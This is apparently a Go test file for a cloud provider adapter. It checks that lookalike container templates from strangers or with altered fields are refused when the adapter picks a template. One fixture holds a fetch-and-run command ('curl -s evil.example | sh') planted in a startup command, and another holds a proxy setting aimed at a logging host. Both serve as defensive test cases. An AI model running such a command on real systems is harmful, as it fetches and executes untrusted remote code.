package lium

import (
	"context"
	"encoding/json"
	"maps"
	"testing"
	"time"

	"github.com/bugnet-sh/bugnet-router/internal/provider"
)

const (
	testDigest = "sha256:2a471ceb0c0ca15563b40dd4421f27f81815765e5d5c4e44619da96ad176fb19"
	testImage  = "ghcr.io/bugnet-sh/bugnet-base@" + testDigest
	// testTemplateBody is design 3.10's template for the test image, byte for byte
	testTemplateBody = `{"name":"bugnet-base-2026-11-3-2a471ceb0c0c",` +
		`"docker_image":"ghcr.io/bugnet-sh/bugnet-base","docker_image_tag":"2026.11.3",` +
		`"docker_image_digest":"` + testDigest + `","category":"UBUNTU","is_private":true,` +
		`"volumes":["/workspace"],"internal_ports":[22],"environment":{},` +
		`"startup_commands":"sleep infinity","one_time_template":false,"is_temporary":false,` +
		`"supports_docker":false,"supports_volume_encryption":false}`
)

// ourTemplate is the template the adapter would make for the test image, as Lium lists it
func ourTemplate(id string) map[string]any {
	var t map[string]any
	if err := json.Unmarshal([]byte(testTemplateBody), &t); err != nil {
		panic(err)
	}
	t["id"], t["user_id"], t["status"] = id, fakeUserID, "CREATED"
	t["description"], t["entrypoint"], t["readme"] = nil, nil, nil
	t["docker_credential_id"], t["download_count"] = nil, 0
	t["created_at"], t["updated_at"] = "2026-11-11T10:00:00Z", "2026-11-11T10:00:00Z"
	return t
}

// changed is ourTemplate with some fields replaced
func changed(id string, fields map[string]any) map[string]any {
	t := ourTemplate(id)
	maps.Copy(t, fields)
	return t
}

func TestLiumTemplateLookalike(t *testing.T) {
	f := newFake(t)
	for id, fields := range map[string]map[string]any{
		// A stranger's public template with our name and image
		"public":   {"is_private": false, "user_id": "stranger"},
		"stranger": {"user_id": "a7d3e1f0-0000-4000-8000-000000000001"},
		"digest": {"docker_image_digest": "sha256:" +
			"0000000000000000000000000000000000000000000000000000000000000000"},
		"command":     {"startup_commands": "sleep infinity & curl -s evil.example | sh"},
		"entrypoint":  {"entrypoint": "/bin/logger"},
		"image":       {"docker_image": "ghcr.io/stranger/bugnet-base"},
		"name":        {"name": "bugnet-base-2026-11-3-ffffffffffff"},
		"ports":       {"internal_ports": []any{22, 8080}},
		"volumes":     {"volumes": []any{"/root"}},
		"environment": {"environment": map[string]any{"HTTP_PROXY": "http://logger:3128"}},
		"one-time":    {"one_time_template": true},
		"temporary":   {"is_temporary": true},
		"no digest":   {"docker_image_digest": nil},
		"no private":  {"is_private": nil},
	} {
		f.addTemplate(changed("bad-"+id, fields))
	}
	// A template whose fields Lium writes in a shape the adapter cannot read is never taken
	f.addTemplate(changed("unreadable", map[string]any{"volumes": "/workspace"}))
	p := f.provider(t, testOptions(), time.Now)

	id, err := p.template(context.Background(), testImage)
	if err != nil {
		t.Fatal(err)
	}
	made := f.requestsTo("POST", "/templates")
	if len(made) != 1 || len(f.requestsTo("POST", "/templates/check")) != 1 {
		t.Fatalf("a lookalike was taken, %d templates made", len(made))
	}
	eq(t, string(made[0].body), testTemplateBody)
	eq(t, string(f.requestsTo("POST", "/templates/check")[0].body), testTemplateBody)
	var body map[string]any
	if err := json.Unmarshal(made[0].body, &body); err != nil {
		t.Fatal(err)
	}
	if id == "" || id[:4] == "bad-" || id == "unreadable" {
		t.Fatalf("template %q", id)
	}

	// The process keeps the template it took
	again, err := p.template(context.Background(), testImage)
	if err != nil || again != id {
		t.Fatalf("second lookup gave %q, %v", again, err)
	}
	eq(t, len(f.requestsTo("GET", "/templates")), 1)
	eq(t, len(f.requestsTo("GET", "/users/me")), 1)
}

func TestLiumTemplateReused(t *testing.T) {
	f := newFake(t)
	f.addTemplate(changed("bad", map[string]any{"is_private": false}))
	f.addTemplate(ourTemplate("ours"))
	p := f.provider(t, testOptions(), time.Now)
	id, err := p.template(context.Background(), testImage)
	if err != nil {
		t.Fatal(err)
	}
	eq(t, id, "ours")
	eq(t, len(f.requestsTo("POST", "/templates")), 0)
	eq(t, len(f.requestsTo("POST", "/templates/check")), 0)
}

func TestLiumTemplateWithoutAccountID(t *testing.T) {
	f := newFake(t)
	f.userID = ""
	// Without our id the owner check is skipped, every other check still holds
	f.addTemplate(changed("another-owner", map[string]any{"user_id": "someone"}))
	p := f.provider(t, testOptions(), time.Now)
	id, err := p.template(context.Background(), testImage)
	if err != nil {
		t.Fatal(err)
	}
	eq(t, id, "another-owner")
}

func TestLiumTemplateCheckRefuses(t *testing.T) {
	f := newFake(t)
	f.checkIssues = []map[string]any{{
		"field": "docker_image", "code": "image_no_linux_amd64",
		"message": "no linux/amd64 build",
	}}
	p := f.provider(t, testOptions(), time.Now)
	_, err := p.template(context.Background(), testImage)
	e, ok := provider.AsError(err)
	if !ok || e.Code != provider.CodeInvalid || !e.CanFailOver {
		t.Fatalf("a refused check gave %v", err)
	}
	eq(t, len(f.requestsTo("POST", "/templates")), 0)
}

func TestLiumTemplateOfAnotherImage(t *testing.T) {
	f := newFake(t)
	p := f.provider(t, testOptions(), time.Now)
	other := "ghcr.io/bugnet-sh/bugnet-base:2026.11.4@sha256:" +
		"b0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0c1c2c3c4c5c6c7c8c9cacbcccdcecf"
	if _, err := p.template(context.Background(), other); err != nil {
		t.Fatal(err)
	}
	var body map[string]any
	if err := json.Unmarshal(f.requestsTo("POST", "/templates")[0].body, &body); err != nil {
		t.Fatal(err)
	}
	eq(t, body["name"], any("bugnet-base-2026-11-4-b0b1b2b3b4b5"))
	eq(t, body["docker_image"], any("ghcr.io/bugnet-sh/bugnet-base"))
	eq(t, body["docker_image_tag"], any("2026.11.4"))
	eq(t, body["docker_image_digest"], any("sha256:"+
		"b0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0c1c2c3c4c5c6c7c8c9cacbcccdcecf"))

	// A ref with no tag of its own names no tag, the version belonging to the configured image
	untagged := "registry.example:5000/team/img@sha256:" +
		"c0c1c2c3c4c5c6c7c8c9cacbcccdcecfd0d1d2d3d4d5d6d7d8d9dadbdcdddedf"
	if _, err := p.template(context.Background(), untagged); err != nil {
		t.Fatal(err)
	}
	body = nil
	if err := json.Unmarshal(f.requestsTo("POST", "/templates")[1].body, &body); err != nil {
		t.Fatal(err)
	}
	eq(t, body["name"], any("img-c0c1c2c3c4c5"))
	eq(t, body["docker_image"], any("registry.example:5000/team/img"))
	if _, ok := body["docker_image_tag"]; ok {
		t.Fatalf("an untagged ref sent a tag: %v", body)
	}

	for _, ref := range []string{"ghcr.io/bugnet-sh/bugnet-base:2026.11.3", "",
		"ghcr.io/x@sha256:abc", "@" + testDigest} {
		_, err := p.template(context.Background(), ref)
		if e, ok := provider.AsError(err); !ok || e.Code != provider.CodeInvalid {
			t.Errorf("ref %q gave %v, want invalid", ref, err)
		}
	}
}
